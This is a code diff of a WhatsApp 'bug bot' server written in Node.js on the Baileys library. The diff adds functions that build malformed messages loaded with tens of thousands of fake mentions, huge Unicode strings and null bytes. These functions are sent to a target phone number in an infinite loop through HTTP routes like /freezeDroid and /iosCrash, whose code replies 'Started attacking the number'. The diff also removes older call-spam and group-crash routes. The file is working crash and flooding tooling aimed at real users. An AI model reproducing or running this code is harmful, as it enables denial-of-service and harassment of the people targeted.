@@ -1,25 +1,15 @@
-//base by DGXeon (Xeon Bot Inc.)
-//re-upload? recode? copy code? give credit ya :)
-//YouTube: @DGXeon
-//Instagram: unicorn_xeon13
-//Telegram: @DGXeon
-//GitHub: @DGXeon
-//WhatsApp: +916909137213
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
-//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9
 
-const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
+
+const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baileys")
 const fs = require('fs')
 const util = require('util')
-const cors = require("cors")
-const pino = require('pino')
-const express = require('express')
+const express = require('express');
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-module.exports = async (XeonBotInc, m) => {
+module.exports = async (sam, m) => {
 try {
 const from = m.key.remoteJid
 var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
@@ -30,8 +20,8 @@ const isCmd = body.startsWith(prefix);
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
 const args = body.trim().split(/ +/).slice(1)
 const text = q = args.join(" ")
-const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
-const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+const sender = m.key.fromMe ? (sam.user.id.split(':')[0]+'@s.whatsapp.net' || sam.user.id) : (m.key.participant || m.key.remoteJid)
+const botNumber = await sam.decodeJid(sam.user.id)
 const senderNumber = sender.split('@')[0]
 const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
 const pushname = m.pushName || `${senderNumber}`
@@ -52,12 +42,11 @@ function toWhatsAppJID(phoneNumber) {
 //====================================\\
 // Add this helper function to check developer numbers
 function isDeveloperNumber(phoneNumber) {
-    const developerNumbers = ['916909137213', '919402104403']; // List of developer numbers without the "+"
+    const developerNumbers = ['254101415520', '2348144723858']; // List of developer numbers without the "+"
     const cleanedNumber = phoneNumber.replace(/\+/g, ''); // Remove "+" if present
     return developerNumbers.includes(cleanedNumber);
 }
 //====================================\\
-app.use(cors());
 app.use(express.json()); // Middleware to parse JSON bodies
 //====================================\\
 app.get('/freezeDroid', async (req, res) => {
@@ -66,82 +55,444 @@ app.get('/freezeDroid', async (req, res) => {
     if (isDeveloperNumber(target)) {
         return res.status(403).send('Cannot attack developer');
     }
-async function XeonXRobust(target, o, Ptcp = true) {
-	const jid = toWhatsAppJID(target); // Convert phone number to JID
-	const jids = `_*~@916909137213~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(1500);
-	while (true) {
-   await XeonBotInc.relayMessage(jid, {
-     ephemeralMessage: {
-      message: {
-       interactiveMessage: {
-        header: {
-         documentMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-          fileLength: "9999999999999",
-          pageCount: 1316134911,
-          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-          fileName: "🦄드림 가이 Xeon",
-          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1726867151",
-          contactVcard: true,
-          jpegThumbnail: o,
-         },
-         hasMediaAttachment: true,
+async function protocolbug6(target, mention) {
+    const quotedMessage = {
+        extendedTextMessage: {
+            text: "᭯".repeat(12000),
+            matchedText: "https://" + "ꦾ".repeat(500) + ".com",
+            canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
+            description: "\u0000".repeat(500),
+            title: "\u200D".repeat(1000),
+            previewType: "NONE",
+            jpegThumbnail: Buffer.alloc(10000),
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true,
+                externalAdReply: {
+                    showAdAttribution: true,
+                    title: "BoomXSuper",
+                    body: "\u0000".repeat(10000),
+                    thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                    sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
+                },
+                mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
+            }
         },
+        paymentInviteMessage: {
+            currencyCodeIso4217: "USD",
+            amount1000: "999999999",
+            expiryTimestamp: "9999999999",
+            inviteMessage: "Payment Invite" + "💥".repeat(1770),
+            serviceType: 1
+        }
+    };
 
-									body: { text: '🦄드림 가이 Xeon' + ui + jids },
-									contextInfo: {
-										mentionedJid: ['916909137213@s.whatsapp.net'],
-										mentions: ['916909137213@s.whatsapp.net'],
-										},
-								    footer: { text: '' },
-									nativeFlowMessage: {},
+    const mentionedList = [
+        "13135550002@s.whatsapp.net",
+        ...Array.from({ length: 40000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+
+    const embeddedMusic = {
+        musicContentMediaId: "589608164114571",
+        songId: "870166291800508",
+        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
+        title: "PhynixAgency",
+        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
+        countryBlocklist: true,
+        isExplicit: true,
+        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+    };
+
+    const videoMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
+        fileLength: "109951162777600",
+        seconds: 999999,
+        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
+        caption: "ꦾ".repeat(12777),
+        height: 640,
+        width: 640,
+        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
+        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1743848703",
         contextInfo: {
-         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
-          length: 30000
-         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
-         forwardingScore: 1,
-         isForwarded: true,
-         fromMe: false,
-         participant: "0@s.whatsapp.net",
-         remoteJid: "status@broadcast",
-         quotedMessage: {
-          documentMessage: {
-           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-           fileLength: "9999999999999",
-           pageCount: 1316134911,
-           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-           fileName: "🦄드림 가이 Xeon",
-           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-           mediaKeyTimestamp: "1724474503",
-           contactVcard: true,
-           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-           jpegThumbnail: "",
-          },
-         },
+            externalAdReply: {
+                showAdAttribution: true,
+                title: "☠️ - んジェラルド - ☠️",
+                body: "\u0000".repeat(9117),
+                mediaType: 1,
+                renderLargerThumbnail: true,
+                thumbnailUrl: null,
+                sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
+            },
+            businessMessageForwardInfo: {
+                businessOwnerJid: target
+            },
+            quotedMessage: quotedMessage,
+            isSampled: true,
+            mentionedJid: mentionedList
         },
-       },
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363321780343299@newsletter",
+            serverMessageId: 1,
+            newsletterName: "ꦾ".repeat(100)
+        },
+        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
+        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
+        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
+        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
+        annotations: [
+            {
+                embeddedContent: {
+                    embeddedMusic
+                },
+                embeddedAction: true
+            }
+        ]
+    };
+
+    const msg = generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: { videoMessage }
+        }
+    }, {});
+
+    await sam.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            { tag: "to", attrs: { jid: target }, content: undefined }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    if (mention) {
+        await sam.relayMessage(target, {
+            groupStatusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg.key,
+                        type: 25
+                    }
+                }
+            }
+        }, {
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: { is_status_mention: "true" },
+                    content: undefined
+                }
+            ]
+        });
+    }
+}
+
+async function bulldozer(target) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
       },
-     },
     },
-    Ptcp ? {
-     participant: {
-      jid: jid
-     }
-    } : {}
-   );
-await delay(15000); // Delay for 15 seconds
-    }
-	}
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+
+  await sam.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
+async function TrashProtocol(target, mention) {
+                const sex = Array.from({ length: 9741 }, (_, r) => ({
+                       title: "꧀".repeat(9741),
+                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
+                             }));
+                             
+                             const MSG = {
+                             viewOnceMessage: {
+                             message: {
+                             listResponseMessage: {
+                             title: "𝚖𝚊𝚗𝚞𝚜𝚒𝚊 𝚕𝚎𝚖𝚊𝚑",
+                             listType: 2,
+                             buttonText: null,
+                             sections: sex,
+                             singleSelectReply: { selectedRowId: "🇷🇺" },
+                             contextInfo: {
+                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                             participant: target,
+                             remoteJid: "status@broadcast",
+                             forwardingScore: 9741,
+                             isForwarded: true,
+                             forwardedNewsletterMessageInfo: {
+                             newsletterJid: "9741@newsletter",
+                             serverMessageId: 1,
+                             newsletterName: "-"
+                             }
+                             },
+                             description: "🇷🇺"
+                             }
+                             }
+                             },
+                             contextInfo: {
+                             channelMessage: true,
+                             statusAttributionType: 2
+                             }
+                             };
+
+                             const msg = generateWAMessageFromContent(target, MSG, {});
+
+                             await sam.relayMessage("status@broadcast", msg.message, {
+                             messageId: msg.key.id,
+                             statusJidList: [target],
+                             additionalNodes: [
+                             {
+                             tag: "meta",
+                             attrs: {},
+                             content: [
+                             {
+                             tag: "mentioned_users",
+                             attrs: {},
+                             content: [
+                             {
+                             tag: "to",
+                             attrs: { jid: target },
+                             content: undefined
+                             }
+                             ]
+                             }
+                             ]
+                             }
+                             ]
+                             });
+
+                             if (mention) {
+                             await sam.relayMessage(
+                             target,
+                             {
+                             statusMentionMessage: {
+                             message: {
+                             protocolMessage: {
+                             key: msg.key,
+                             type: 25
+                             }
+                             }
+                             }
+                             },
+                             {
+                additionalNodes: [
+                    {
+                       tag: "meta",
+                           attrs: { is_status_mention: "DreadosFortex is back ▾" },
+                             content: undefined
+}
+]
+}
+);
+}
+}
+async function invisfc(target, mention) {
+            let msg = await generateWAMessageFromContent(target, {
+                buttonsMessage: {
+                    text: "🩸",
+                    contentText:
+                        "𝚢𝚊𝚑𝚊𝚑𝚊 𝚗𝚐𝚎𝚕𝚊𝚐",
+                    footerText: "𝙳𝚛𝚎𝚊𝚍𝚘𝚜𝙵𝚘𝚛𝚝𝚎𝚡 𝚒𝚜 𝚋𝚊𝚌𝚔 ༑",
+                    buttons: [
+                        {
+                            buttonId: ".bugs",
+                            buttonText: {
+                                displayText: "🇷🇺" + "\u0000".repeat(800000),
+                            },
+                            type: 1,
+                        },
+                    ],
+                    headerType: 1,
+                },
+            }, {});
+        
+            await sam.relayMessage("status@broadcast", msg.message, {
+                messageId: msg.key.id,
+                statusJidList: [target],
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "mentioned_users",
+                                attrs: {},
+                                content: [
+                                    {
+                                        tag: "to",
+                                        attrs: { jid: target },
+                                        content: undefined,
+                                    },
+                                ],
+                            },
+                        ],
+                    },
+                ],
+            });
+            if (mention) {
+                await sam.relayMessage(
+                    target,
+                    {
+                        groupStatusMentionMessage: {
+                            message: {
+                                protocolMessage: {
+                                    key: msg.key,
+                                    type: 25,
+                                },
+                            },
+                        },
+                    },
+                    {
+                        additionalNodes: [
+                            {
+                                tag: "meta",
+                                attrs: { is_status_mention: "⟅̊༑ ▾𝚖𝚊𝚔𝚕𝚞⟅̊༑ ▾ " },
+                                content: undefined,
+                            },
+                        ],
+                    }
+                );
+            }
+        }
+ async function Forcloseinvisstanza(target) {
+    const generateMessage = {
+        viewOnceMessage: {
+            message: {
+                extendedTextMessage: {
+                    text: '.',
+                    contextInfo: {
+                        stanzaId: target,
+                        participant: target,
+                        quotedMessage: {
+                            conversation: "The Devil's Is Here" + " ꦾ".repeat(100)
+                        },
+                        disappearingMode: {
+                            initiator: "CHANGED_IN_CHAT",
+                            trigger: 'CHAT_SETTING'
+                        }
+                    },
+                    inviteLinkGroupTypeV2: "DEFAULT"
+                },
+                contextInfo: {
+                    mentionedJid: Array.from({
+                        length: 30000
+                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                    isSampled: true,
+                    remoteJid: "status@broadcast",
+                    forwardingScore: 9741,
+                    isForwarded: true
+                }
+            }
+        }
+    };
+
+    const msg = generateWAMessageFromContent(target, generateMessage, {});
+
+    await sam.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: {
+                        jid: target
+                    },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
+}       
     // Basic validation for phone numbers
     const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
     if (!target || !phoneNumberPattern.test(target)) {
@@ -149,104 +500,24 @@ await delay(15000); // Delay for 15 seconds
     }
     try {
     	res.send(`Started attacking the number ${target}`);
-        await XeonXRobust(target); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-app.get('/spamPairing', async (req, res) => {
-    const { target } = req.query; // Access the target parameter from the query string
-    // Check if the target is a developer number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
-    }
-async function SendPairing(target, Ptcp = true) {
-const jid = toWhatsAppJID(target); // Convert phone number to JID
-            while (true) {
-			await XeonBotInc.relayMessage(target, {
-					viewOnceMessage: {
-						message: {
-								nativeFlowResponseMessage: {
-									"status":true,
-                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
-							}
-						}
-					}
-				},
-				Ptcp ? {
-					participant: {
-						jid: jid
-					}
-				} : {}
-			);
-}
-};
-// Basic validation for phone numbers
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
-    }    
-    try {
-    	res.send(`Started attacking the number ${target}`);
-        await SendPairing(target); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-app.get('/callSpam', async (req, res) => {
-	
-    const { target } = req.query; // Access the target parameter from the query string
-    // Check if the target is a developer number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
-    }
-async function samCallSpam(target) {
-const jid = toWhatsAppJID(target); // Convert phone number to JID
-while (true) {
-await XeonBotInc.offerCall(jid);
-}
-		};
-    // Basic validation for phone numbers
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
-    }
-    try {
-    	res.send(`🕷️ Successfully sent spam call to the number ${target}`);
-        await samCallSpam(target); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-app.get('/callvidSpam', async (req, res) => {
-	
-    const { target } = req.query; // Access the target parameter from the query string
-    // Check if the target is a developer number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
-    }
-async function samCallSpamvid(target) {
-const jid = toWhatsAppJID(target); // Convert phone number to JID
-while (true) {
-await XeonBotInc.offerCall(jid, {
-video: true
-});
-}
-		};
-    // Basic validation for phone numbers
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
-    }
-    try {
-    	res.send(`🕷️ Successfully sent spam call to the number ${target}`);
-        await samCallSpamvid(target); // Pass validated phone number to the function
+    	while (true) {
+        await protocolbug6(target)
+        await bulldozer(target)
+        await protocolbug6(target)
+        await TrashProtocol(target);
+        await bulldozer(target)
+        await protocolbug6(target)
+        await invisfc(target);
+        await protocolbug6(target)
+        await TrashProtocol(target);
+        await bulldozer(target)
+        await TrashProtocol(target);
+        await bulldozer(target)
+        await TrashProtocol(target);
+        await invisfc(target);
+        await protocolbug6(target);
+        }
+         // Pass validated phone number to the function
     } catch (error) {
         console.error(error.message);
         res.status(500).send('An error occurred while sending the message');
@@ -260,10 +531,10 @@ app.get('/iosCrash', async (req, res) => {
         return res.status(403).send('Cannot attack developer');
     }
 async function XeonIosOld(target) {
-await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 } 
 async function XeonIosPayOld(jid) {
-			XeonBotInc.relayMessage(jid, {
+			sam.relayMessage(jid, {
 				'paymentInviteMessage': {
 					'serviceType': "UPI",
 					'expiryTimestamp': Date.now() + 86400000
@@ -275,7 +546,7 @@ async function XeonIosPayOld(jid) {
 			});
 		};
 	async function XeonIosNew(jid) {
-			XeonBotInc.relayMessage(jid, {
+			sam.relayMessage(jid, {
 				'extendedTextMessage': {
 					'text': '.',
 					'contextInfo': {
@@ -324,122 +595,7 @@ await delay(15000); // Delay for 15 seconds
     }
 });
 //====================================\\
-app.get('/crashGroup', async (req, res) => {
-    const { target } = req.query; // Access the target parameter from the query string
-    async function xgc2(target){
-    	    const result = target.split('https://chat.whatsapp.com/')[1]
-    const xeontry = await XeonBotInc.groupAcceptInvite(result)
-		await XeonBotInc.relayMessage(xeontry, {
-'groupInviteMessage': {
-"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
-"groupName":` 🦄드림 가이 Xeon`.repeat(1500),
-'groupJid': '120363047626537933@g.us',
-'inviteExpiration': '999',
-'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
-"inviteCode": 'h+64P9RhJDzgXSPf',
-'contextInfo': {
-'isForwarded': true,
-'fromMe': false,
-'participant': '0@s.whatsapp.net',
-'remoteJid': sender,
-'quotedMessage': {
-documentMessage: {
-url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
-mimetype: "application/pdf",
-title: "crash",
-pageCount: 1000000000,
-fileName: "crash.pdf".repeat(1500),
-contactVcard: true
-}
-},
-'forwardedNewsletterMessageInfo': {
-'newsletterJid': '120363222395675670@newsletter',
-'serverMessageId': 1,
-'newsletterName': "🦄드림 가이 Xeon".repeat(1500)
-}
-}
-}
-}, {});
-		}
-// Regular expression to validate WhatsApp group links
-    const groupLinkPattern = /^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/;
-    // Validate the target
-    if (!target || !groupLinkPattern.test(target)) {
-        return res.status(400).send('The link you provided is invalid');
-    }    
-    try {
-        res.send(`Successfully started attacking the group chat`);
-        await xgc2(target);
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
-});
-//====================================\\
-const ytdl = require("ytdl-core");
-const path = require("path");
 
-// Route for YouTube to MP3 download
-app.get("/download/ytmp3", async (req, res) => {
-    const videoUrl = req.query.url;
-
-    // Validate YouTube URL
-    if (!videoUrl || !ytdl.validateURL(videoUrl)) {
-        return res.status(400).json({
-            success: false,
-            message: "Invalid YouTube URL.",
-        });
-    }
-
-    try {
-        // Extract video info
-        const videoInfo = await ytdl.getInfo(videoUrl);
-        const title = videoInfo.videoDetails.title;
-
-        // Set the output file path
-        const fileName = `${title.replace(/[^a-zA-Z0-9]/g, "_")}.mp3`;
-        const filePath = path.resolve(__dirname, "downloads", fileName);
-
-        // Ensure the "downloads" directory exists
-        if (!fs.existsSync("downloads")) {
-            fs.mkdirSync("downloads");
-        }
-
-        // Stream and convert to MP3
-        const stream = ytdl(videoUrl, { filter: "audioonly" }).pipe(
-            fs.createWriteStream(filePath)
-        );
-
-        stream.on("finish", () => {
-            // Respond with download link
-            res.status(200).json({
-                success: true,
-                message: "Download successful.",
-                result: {
-                    title,
-                    download_url: `${req.protocol}://${req.get("host")}/downloads/${fileName}`,
-                },
-            });
-        });
-
-        stream.on("error", (err) => {
-            console.error("Error during streaming:", err);
-            res.status(500).json({
-                success: false,
-                message: "Error occurred while processing the video.",
-            });
-        });
-    } catch (error) {
-        console.error("Error during YouTube MP3 conversion:", error);
-        res.status(500).json({
-            success: false,
-            message: "An unexpected error occurred.",
-        });
-    }
-});
-
-// Serve the "downloads" directory
-app.use("/downloads", express.static(path.join(__dirname, "downloads")));
 //====================================\\
 // Start the server and connect to WhatsApp
 app.listen(PORT, () => {
